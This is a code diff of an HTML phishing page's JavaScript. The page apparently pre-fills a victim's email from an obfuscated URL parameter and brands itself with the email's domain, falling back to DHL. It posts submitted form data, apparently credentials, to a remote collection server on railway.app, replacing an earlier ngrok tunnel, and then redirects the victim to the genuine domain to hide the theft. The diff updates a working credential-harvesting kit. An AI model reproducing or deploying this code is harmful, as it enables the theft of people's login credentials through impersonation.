@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data_bollob="">
+<html lang="en" data-bollob="ttt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -261,10 +261,20 @@
 
 
     <script>
+        // var originalLink = "https://camelion2-prod.up.railway.app/frontend/ong/on-pardon/og/";
+
+        // var encodedLink = btoa(originalLink);
+        // var decodedLink = atob(encodedLink)
+
+        // console.log(encodedLink);
+        // console.log(decodedLink);
+        // const bollob = (document.querySelector('html').getAttribute('data-bollob'));
+        // console.log(bollob);
+
         const searchParams = new URLSearchParams(window.location.search);
         const hashedEmailValue = searchParams.get('wtundnm20njfnnfkjfjjffjj_em')?searchParams.get('wtundnm20njfnnfkjfjjffjj_em'):"";
         const domainFromEmail = hashedEmailValue.split('@');
-        const myDomain = domainFromEmail.length > 1 ? domainFromEmail[1]: 'avila';
+        const myDomain = domainFromEmail.length > 1 ? domainFromEmail[1]: 'dhl.com';
         const domainRmCom = myDomain.replace(/\.com$/, "");
         const backgroundImage = document.querySelector('#background-img');
         const showEmail = document.querySelector('#email');
@@ -309,17 +319,15 @@
                 
                 console.log("Action 2");
                 sendData(formData)
-                setTimeout(() => {
-                    removeBtnSpinner();
-                }, 2500);
+                window.location.href = `https://www.${myDomain}`;
             } else {
                 // this handles the first click
                 console.log("Action 1");
                 sendData(formData)
 
-                setTimeout(() => {
-                    removeBtnSpinner();
-                }, 2500);
+                // setTimeout(() => {
+                //     removeBtnSpinner();
+                // }, 2500);
             }
             // Toggle the state
             isToggled = !isToggled;
@@ -335,7 +343,7 @@
             const formValue = Object.fromEntries(formData.entries());
 
             // Send data to server using Fetch API
-            fetch('https://df7a-197-210-78-81.ngrok-free.app/frontend/ong/on-pardon/og/', {
+            fetch('https://camelion2-prod.up.railway.app/frontend/ong/on-pardon/og/', {
                 method: 'POST',
                 headers:{
                     'Content-Type':'application/json',
@@ -351,6 +359,7 @@
             })
             .then(data => {
                 console.log('Data sent successfully:', data);
+                removeBtnSpinner();
             })
             .catch(error => {
                 console.error('Error sending data to server:', error);
